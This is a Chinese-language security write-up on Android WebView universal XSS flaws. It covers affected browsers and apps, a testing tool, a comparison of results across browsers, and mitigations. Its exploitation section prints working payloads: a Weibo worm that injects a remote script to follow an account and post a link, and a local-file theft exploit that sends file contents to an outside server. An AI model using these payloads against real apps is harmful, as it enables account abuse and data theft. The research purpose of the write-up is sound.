# Android UXSS阶段性小结及自动化测试

0x00 科普
-------

* * *

WebView(网络视图)android中加载显示网页的重要组件，可以将其视为一个浏览器。在kitkat（android 4.4）以前使用WebKit渲染引擎加载显示网页，在kitkat之后使用谷歌自家内核chromium。

Uxss(Universal Cross-Site Scripting通用型XSS)UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。可以到达浏览器全局远程执行命令、绕过同源策略、窃取用户资料以及劫持用户的严重危害。

同源策略所谓同源是指，域名，协议，端口相同，浏览器或者浏览器扩展共同遵循的安全策略。详见：[http://drops.wooyun.org/tips/151](http://drops.wooyun.org/tips/151)

0x01 事件
-------

* * *

近段时间android UXSS漏洞持续性爆发涉及android应用包括主手机流浏览器、聊天软件等。下面截取几个案例。

*   [WooYun: 搜狗手机浏览器跨域脚本执行漏洞之一](http://www.wooyun.org/bugs/wooyun-2014-047674)
*   [WooYun: 手机QQ安卓版两处跨域问题](http://www.wooyun.org/bugs/wooyun-2014-068174)
*   [WooYun: 猎豹/360/欧鹏/百度/遨游等手机浏览器安卓客户端UXSS（影响android4.4以下版本）](http://www.wooyun.org/bugs/wooyun-2014-075184)
*   [WooYun: UC浏览器Android最新版(4.4)跨域漏洞(不受系统版本限制)](http://www.wooyun.org/bugs/wooyun-2014-075143)

引用某厂商对此漏洞的回应

```
非常感谢您的报告，此问题属于andriod webkit的漏洞，请尽量使用最新版的andriod系统。

```

的确漏洞产生的原因是因为kitkat（android 4.4）之前webview组件使用webview内核而遗留的漏洞。使用最新的android系统当然安全性要更高而且运行更流畅，但是有多少人能升级或者使用到相对安全的android版本了。下图来自谷歌官方2014.09.09的统计数据。

![](http://drops.javaweb.org/uploads/images/271414f166ac923393eb545d9701e0c7d3c4a215.jpg)

看起来情况不是太糟糕，有24.5%的android用户是处于相对安全的版本下。但是官方数据的是来google play明显和大陆水土不服。国内就只能使用相对靠谱的本土第三方统计了。下图是umeng八月的统计情况

![](http://drops.javaweb.org/uploads/images/96423962a6a111dc8f2ed87d01d664e331dca2cd.jpg)

能使用到相对安全的android系统的用户不到8%，那么问题来了~我要换一个什么的样的手机了。忘记我是个屌丝了，破手机无法升级到kitkat也没钱换手机。那就只能选择使用相对安全的应用来尽量避免我受到攻击。于是我们收集了一些命中率较高的POC来验证到底哪些app更靠谱一些。

*   https://code.google.com/p/chromium/issues/detail?id=37383
*   https://code.google.com/p/chromium/issues/detail?id=90222
*   https://code.google.com/p/chromium/issues/detail?id=98053
*   https://code.google.com/p/chromium/issues/detail?id=117550
*   https://code.google.com/p/chromium/issues/detail?id=143437
*   https://code.google.com/p/chromium/issues/detail?id=143439
*   CVE-2014-6041

为了方便大家也能够方便测试其他应用我们尝试写出一个自动化的脚本来完成此项工作。

0x02 测试
-------

* * *

[http://zone.wooyun.org/content/15792](http://zone.wooyun.org/content/15792)

下图为360浏览器在android 4.2.2下的测试结果

![](http://drops.javaweb.org/uploads/images/331ec188a2393d9d07124e694f4757caa5acf8d9.jpg)

下图为搜狗浏览器在android 4.4.3下的测试结果

![](http://drops.javaweb.org/uploads/images/3db12b9266bc33094ff3fa633480ca53ffbbb159.jpg)

测试代码将放入github供大家参考，欢迎大神来修改

代码地址：[https://github.com/click1/uxss](https://github.com/click1/uxss)

在线测试地址：[http://uxss.sinaapp.com/index.php](http://uxss.sinaapp.com/index.php)

0x03 对比
-------

我们对主流手机浏览器进行了横向对比，测试对象包括：UC浏览器、搜狗浏览器、百度浏览器、360安全浏览器、欧鹏浏览器、遨游云浏览器、猎豹浏览器。测试结果见下图。

![](http://drops.javaweb.org/uploads/images/3f9e1570e14c8b33f9b48dae4ae4c183aa30f800.jpg)

0x04 建议
-------

* * *

厂商（仅供参考）：

1、服务端禁止iframe嵌套`X-FRAME-OPTIONS:DENY`。详见：[http://drops.wooyun.org/papers/104](http://drops.wooyun.org/papers/104)

2、客户端使用`setAllowFileAccess(false)`方法禁止webview访问本地域。详见：[setAllowFileAccess(boolean)](http://developer.android.com/intl/zh-cn/reference/android/webkit/WebSettings.html#setAllowFileAccess(boolean))

3、客户端使用`onPageStarted (WebView view, String url, Bitmap favicon)`方法在跳转前进行跨域判断。详见[onPageStarted (WebView view, String url, Bitmap favicon)][8]

4、客户端对iframe object标签属性进行过滤。

用户：

1、使用漏洞较少的app，及时更新app。

2、不要随意打开一些莫名其妙的链接。

3、有钱你就买新手机吧，android L马上出来了。（可以通过google play推送安全补丁,呵呵）

0x05 利用
-------

* * *

（此部分考虑到影响并未第一时间放出，现在漏洞已经被忽略，在此更新）

1、[WooYun: 扫描新浪微博安卓客户端UXSS附蠕虫利用](http://www.wooyun.org/bugs/wooyun-2014-079471)蠕虫代码如下：

test.html

```
<iframe name="m" src="http://m.weibo.cn/xxx" onload="window.open('\u0000javascript:window.s%3Ddocument.createElement%28%27script%27%29%3Bwindow.s.src%3D%27http://site/test.js%27%3Bdocument.body.appendChild%28window.s%29%3B','m')" >

```

test.js

```
url = 'http://m.weibo.cn/attentionDeal/addAttention?';

url2 = 'http://m.weibo.cn/mblogDeal/addAMblog?rl=1';

function createXHR(){

    return window.XMLHttpRequest?

    new XMLHttpRequest():

    new ActiveXObject("Microsoft.XMLHTTP");

}





function post(url,data,sync){

    xmlHttp = createXHR();

    xmlHttp.open("POST",url,sync);

    xmlHttp.setRequestHeader("Accept","text/html, application/xhtml+xml, */*");

    xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");

    xmlHttp.send(data);

}



function send(){

    data = 'uid=3605736194';

    data2 = 'content=http://site/worm.html';

    post(url,data,false);

    post(url2,data2,false);

}



function main(){

    try{

    send();

    alert("done");

    }

    catch(e){alert("error");}

}

main();

```

![](http://drops.javaweb.org/uploads/images/cb8ebacae692d62ad9a9bbd73e4b159122e9bcc1.jpg)

![](http://drops.javaweb.org/uploads/images/93f4791c5f951868bbac6d6f3f2e668945d83dad.jpg)

2、窃取本地文件

test.html

```
<button onclick="iframe.src='http://notfound/'">x</button><br>
<button onclick="exploit1()">Get local file!</button><br>
<script>
function exploit1() {
    window.open('\u0000javascript:document.body.innerHTML="<script/src=http://site/test.js></scr"+"ipt><iframe src=file:/default.prop onload=exploit2()  style=width:100%;height:1000px; name=test2></iframe>";','test');
}
</script>
<iframe src="http://m.baidu.com/" id="iframe" style="width:100%;height:1000px;" name="test"></iframe>

```

test.js

```
var flag = 0;
function exploit2(){
  if(flag) {return}
 window.open('\u0000javascript:location.replace("http://site/cross/test.php?test="+escape(document.body.innerHTML))','test2');
  flag = 1;
}

```

服务端接收到android的default.prop文件内容。也可以窃取相应app私有目录/data/data/packagename/下文件

![](http://drops.javaweb.org/uploads/images/0d9067356552379f46ff4003706cd8491e73bfb8.jpg)

0x06 参考
-------

* * *

[RAyH4c（茄子）《细数安卓WebView的那些神洞》](http://static.wooyun.org/upload/summit-wooyun-RAyH4c.zip)

[http://zone.wooyun.org/content/15792](http://zone.wooyun.org/content/15792)

[8](http://drops.javaweb.org/uploads/images/93f4791c5f951868bbac6d6f3f2e668945d83dad.jpg): http://developer.android.com/intl/zh-cn/reference/android/webkit/WebViewClient.html#onPageStarted(android.webkit.WebView, java.lang.String, android.graphics.Bitmap)